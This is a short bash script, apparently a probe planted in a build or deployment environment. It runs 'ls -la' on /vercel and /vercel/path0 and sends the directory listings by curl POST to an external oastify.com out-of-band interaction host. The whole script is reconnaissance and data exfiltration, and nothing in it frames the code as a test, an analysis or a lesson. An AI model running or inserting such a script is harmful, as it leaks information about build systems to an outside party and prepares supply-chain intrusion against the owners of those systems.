#!/bin/bash

curl -X POST -d "$(printf '/vercel/path0' && ls -la /vercel && printf '/vercel/path0' && ls -la /vercel/path0)" https://4uz65jdht25o5e3br591jyzljcp3d0do2.oastify.com
